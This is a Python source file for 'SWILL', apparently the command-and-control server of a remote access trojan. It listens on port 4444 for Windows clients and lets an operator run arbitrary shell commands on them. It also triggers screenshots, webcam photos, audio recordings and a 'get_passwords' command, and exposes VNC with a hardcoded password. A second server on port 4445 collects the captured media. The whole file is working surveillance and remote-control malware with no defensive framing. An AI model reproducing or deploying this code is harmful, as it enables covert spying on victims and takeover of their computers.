import socket
import threading
import os
import subprocess
from datetime import datetime

class SWILLServer:
    def __init__(self):
        self.host = '0.0.0.0'
        self.control_port = 4444
        self.media_port = 4445
        self.clients = {}
        
    def start_control_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.control_port))
        server.listen(10)
        
        print(f"🖥️  [SWILL] Control Server Started on {self.control_port}")
        print(f"🌐 [SWILL] Serveo Domain: swill.serveo.net")
        print(f"🔗 [SWILL] Ready for connections...")
        
        while True:
            client_socket, client_address = server.accept()
            client_id = f"{client_address[0]}_{datetime.now().strftime('%H%M%S')}"
            print(f"🎯 [SWILL] New connection from {client_address}")
            
            self.clients[client_id] = {
                'socket': client_socket,
                'address': client_address,
                'connected_at': datetime.now()
            }
            
            client_thread = threading.Thread(
                target=self.handle_windows_client,
                args=(client_socket, client_address, client_id)
            )
            client_thread.daemon = True
            client_thread.start()
    
    def handle_windows_client(self, client_socket, client_address, client_id):
        try:
            client_socket.send(b"[SWILL] Connected to Serveo Server\n")
            
            while True:
                client_socket.send(b"SWILL> ")
                command = input(f"SWILL[{client_id}]> ")
                
                if command.lower() in ['exit', 'quit']:
                    client_socket.send(b'exit')
                    break
                elif command.lower() == 'vnc_connect':
                    print(f"🔗 [SWILL] VNC available at {client_address[0]}:5900")
                    print(f"🔑 [SWILL] VNC Password: 123456")
                    continue
                elif command.lower() == 'screenshot':
                    client_socket.send(b'screenshot')
                elif command.lower() == 'webcam_capture':
                    client_socket.send(b'webcam_capture')
                elif command.lower() == 'record_audio':
                    client_socket.send(b'record_audio 10')
                elif command.lower() == 'system_info':
                    client_socket.send(b'systeminfo')
                elif command.lower() == 'files_list':
                    client_socket.send(b'dir C:\\Users')
                elif command.lower() == 'get_passwords':
                    client_socket.send(b'powershell "Get-LocalUser | Format-Table Name, Enabled"')
                elif command.lower() == 'ipconfig':
                    client_socket.send(b'ipconfig')
                elif command.lower() == 'whoami':
                    client_socket.send(b'whoami')
                elif command.lower() == 'tasklist':
                    client_socket.send(b'tasklist')
                elif command.lower() == 'vnc_status':
                    client_socket.send(b'tasklist | findstr /i vnc && netstat -an | findstr :5900')
                elif command.lower() == 'help':
                    print("""
🎮 CLIENT COMMANDS:
• system_info - System information
• whoami - Current user
• ipconfig - Network info
• files_list - List files
• screenshot - Capture screen
• webcam_capture - Webcam photo
• record_audio - Record audio
• tasklist - Running processes
• vnc_connect - VNC access info
• vnc_status - Check VNC status
• Any PowerShell/CMD command
                    """)
                    continue
                else:
                    client_socket.send(command.encode())
                
                response = client_socket.recv(8192).decode('utf-8', errors='ignore')
                print(f"\n📨 [RESPONSE from {client_id}]:\n{response}")
                
        except Exception as e:
            print(f"❌ [SWILL] Client error: {e}")
        finally:
            client_socket.close()
            if client_id in self.clients:
                del self.clients[client_id]
            print(f"🔌 [SWILL] Client {client_id} disconnected")
    
    def start_media_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.media_port))
        server.listen(5)
        print(f"📷 [SWILL] Media Server on {self.media_port}")
        
        while True:
            client_socket, client_address = server.accept()
            print(f"📹 [SWILL] Media connection from {client_address}")
            threading.Thread(target=self.handle_media_client, args=(client_socket,)).start()
    
    def handle_media_client(self, client_socket):
        try:
            data_type = client_socket.recv(1024).decode().strip()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if "AUDIO" in data_type:
                filename = f"audio_{timestamp}.wav"
                with open(filename, 'wb') as f:
                    while True:
                        data = client_socket.recv(4096)
                        if not data or b'[END]' in data:
                            if not data.endswith(b'[END]'):
                                f.write(data)
                            break
                        f.write(data)
                print(f"🎵 [SWILL] Audio saved: {filename}")
                
            elif "PHOTO" in data_type or "SCREEN" in data_type:
                ext = "jpg"
                filename = f"{data_type.lower()}_{timestamp}.{ext}"
                with open(filename, 'wb') as f:
                    while True:
                        data = client_socket.recv(4096)
                        if not data or b'[END]' in data:
                            if not data.endswith(b'[END]'):
                                f.write(data)
                            break
                        f.write(data)
                print(f"🖼️  [SWILL] File saved: {filename}")
                
        except Exception as e:
            print(f"❌ [SWILL] Media error: {e}")
        finally:
            client_socket.close()
    
    def show_clients(self):
        print("\n👥 [SWILL] Connected Clients:")
        for client_id, info in self.clients.items():
            print(f"  {client_id} - {info['address']}")
    
    def start(self):
        print("🚀 Starting SWILL Server with Serveo...")
        
        control_thread = threading.Thread(target=self.start_control_server)
        media_thread = threading.Thread(target=self.start_media_server)
        
        control_thread.daemon = True
        media_thread.daemon = True
        
        control_thread.start()
        media_thread.start()
        
        try:
            while True:
                print("\n⚡ [SWILL] Server Commands: clients, help, exit")
                cmd = input("SWILL-SERVER> ")
                
                if cmd == "clients":
                    self.show_clients()
                elif cmd == "help":
                    print("📋 SERVER COMMANDS: clients, help, exit")
                elif cmd == "exit":
                    break
                else:
                    print("❌ Unknown command")
                    
        except KeyboardInterrupt:
            print("\n🛑 [SWILL] Shutting down...")

if __name__ == "__main__":
    server = SWILLServer()
    server.start()
